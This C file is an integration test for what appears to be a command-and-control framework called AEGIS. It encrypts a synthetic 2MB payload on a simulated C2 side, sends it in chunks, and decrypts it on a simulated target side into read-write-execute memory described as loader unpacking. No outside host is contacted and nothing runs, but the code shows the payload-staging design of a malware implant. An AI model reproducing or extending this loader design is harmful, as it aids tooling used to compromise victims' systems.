#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>

#include "../common/types.h"
#include "../common/config.h"
#include "../c2_comms/crypto.h"
#include "../c2_comms/c2_client.h"

#define PAYLOAD_SIZE (2 * 1024 * 1024)

#define TEST_ASSERT(cond, msg) \
    do { \
        if (!(cond)) { \
            fprintf(stderr, "[FAIL] %s:%d: %s\n", __FILE__, __LINE__, msg); \
            exit(EXIT_FAILURE); \
        } \
    } while (0)

typedef struct {
    uint32_t chunk_id;
    uint32_t data_len; /* Actual data length (may be < chunk) */
    uint8_t iv[AEGIS_GCM_IV_BYTES];
    uint8_t tag[AEGIS_GCM_TAG_BYTES];
} AEGIS_PACKED vault_chunk_header_t;

void test_e2e_2mb_pipeline() {
    printf("[*] Starting E2E 2MB Crypto Integration Test...\n");

    // Initialize two distinct crypto contexts representing the C2 agent and the target
    aegis_crypto_ctx_t c2_ctx;
    aegis_crypto_ctx_t target_ctx;

    // Using a simple common PSK
    const char *test_psk = "Rz9kX3BhcnRuZXJzX2luX2NyaW1lX0xPX2FuZF9FTkk=";

    TEST_ASSERT(aegis_crypto_init(&c2_ctx, test_psk) == AEGIS_OK, "C2 crypto init failed");
    TEST_ASSERT(aegis_crypto_init(&target_ctx, test_psk) == AEGIS_OK, "Target crypto init failed");

    // 1. C2 side: Generate and encrypt 2MB payload
    printf("    -> Generating 2MB payload (C2 Side)...\n");
    uint8_t *payload = malloc(PAYLOAD_SIZE);
    TEST_ASSERT(payload != NULL, "Payload alloc failed");

    for (size_t i = 0; i < PAYLOAD_SIZE; i++) {
        payload[i] = (uint8_t)(i % 256);
    }

    // 2. Fragmenting and sending 64KB chunks simulating C2 distributing payload
    size_t chunk_size = AEGIS_IPC_MAX_MSG_SIZE - sizeof(vault_chunk_header_t);
    size_t num_chunks = (PAYLOAD_SIZE + chunk_size - 1) / chunk_size;

    printf("    -> Chunking 2MB into %zu chunks of %zu bytes...\n", num_chunks, chunk_size);

    // Simulated network transport
    uint8_t *network_buffer = malloc(AEGIS_IPC_MAX_MSG_SIZE);
    TEST_ASSERT(network_buffer != NULL, "Network buffer alloc failed");

    // Target side: Receiving chunks and assembling directly into the mmap region
    printf("    -> Simulating Loader mmap unpacking (PROT_READ|PROT_WRITE|PROT_EXEC)...\n");
    void *exec_map = mmap(NULL, PAYLOAD_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    TEST_ASSERT(exec_map != MAP_FAILED, "Loader mmap failed");

    // AAD for all chunks (simulating standard protocol context)
    uint8_t aad[] = "e2e-2mb-protocol";

    for (size_t i = 0; i < num_chunks; i++) {
        size_t current_chunk_size = chunk_size;
        size_t offset = i * chunk_size;

        if (offset + current_chunk_size > PAYLOAD_SIZE) {
            current_chunk_size = PAYLOAD_SIZE - offset;
        }

        // --- C2 Agent Simulation (Encrypting chunk) ---
        uint8_t *plaintext_chunk = payload + offset;
        vault_chunk_header_t header;
        header.chunk_id = i;
        header.data_len = current_chunk_size;

        uint8_t *ciphertext_chunk = network_buffer + sizeof(vault_chunk_header_t);

        aegis_result_t res = aegis_encrypt(&c2_ctx, plaintext_chunk, current_chunk_size, aad, sizeof(aad), ciphertext_chunk, header.iv, header.tag);
        TEST_ASSERT(res == AEGIS_OK, "Chunk encryption failed");

        // Prepend header to network buffer
        memcpy(network_buffer, &header, sizeof(vault_chunk_header_t));

        // --- Network Transmission Simulation ---

        // --- Target Agent Simulation (Decrypting and Assembling directly into mmap) ---
        vault_chunk_header_t *received_header = (vault_chunk_header_t *)network_buffer;
        uint8_t *received_ciphertext = network_buffer + sizeof(vault_chunk_header_t);

        uint8_t *decrypted_chunk = (uint8_t *)exec_map + (received_header->chunk_id * chunk_size);

        // Note: Target decrypts the chunk. Since it's a simulated stream, target context must stay perfectly synchronized
        // We use standard aegis_decrypt to simulate full C2 protocol synchronization.
        res = aegis_decrypt(&target_ctx, received_ciphertext, received_header->data_len, aad, sizeof(aad), received_header->iv, received_header->tag, decrypted_chunk);

        if (res != AEGIS_OK) {
            fprintf(stderr, "Chunk %zu decryption failed\n", i);
            TEST_ASSERT(res == AEGIS_OK, "Chunk decryption failed");
        }
    }

    printf("    -> All chunks encrypted, transmitted, and decrypted successfully.\n");
    printf("    -> Verifying synchronization between C2 and Target...\n");
    TEST_ASSERT(c2_ctx.msg_counter == target_ctx.msg_counter, "Crypto contexts out of sync!");

    // 3. Verify final mapped payload matches original
    printf("    -> Verifying E2E mapped payload integrity...\n");
    TEST_ASSERT(memcmp(payload, exec_map, PAYLOAD_SIZE) == 0, "Mapped payload does not match original!");

    munmap(exec_map, PAYLOAD_SIZE);
    free(payload);
    free(network_buffer);

    aegis_crypto_destroy(&c2_ctx);
    aegis_crypto_destroy(&target_ctx);

    printf("[+] E2E 2MB Crypto Integration Test passed.\n");
}

int main() {
    printf("========================================================\n");
    printf("  AEGIS E2E INTEGRATION TEST (2MB PAYLOAD)             \n");
    printf("========================================================\n\n");

    test_e2e_2mb_pipeline();

    printf("\n========================================================\n");
    printf("  ALL INTEGRATION TESTS PASSED SUCCESSFULLY             \n");
    printf("========================================================\n");

    return 0;
}
